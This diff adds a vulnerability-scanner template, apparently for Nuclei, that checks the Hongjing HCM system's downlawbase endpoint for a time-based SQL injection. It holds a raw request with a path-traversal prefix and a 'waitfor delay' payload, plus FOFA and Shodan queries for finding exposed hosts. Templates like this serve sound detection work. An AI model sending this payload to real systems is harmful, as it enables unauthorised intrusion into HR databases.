@@ -1,0 +1,31 @@
+id: hjsoft-downlawbase-sqli
+info:
+  name: 宏景 HCM 系统 downlawbase - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - demo
+  metadata:
+    verified: true
+    fofa-query: app="HJSOFT-HCM"
+    shodan-query: http.html:'src="/general/sys/hjaxmanage.js"'
+  tags: hjsoft,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /templates/attestation/../../selfservice/lawbase/downlawbase?id=11';waitfor+delay+'0:0:6'--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
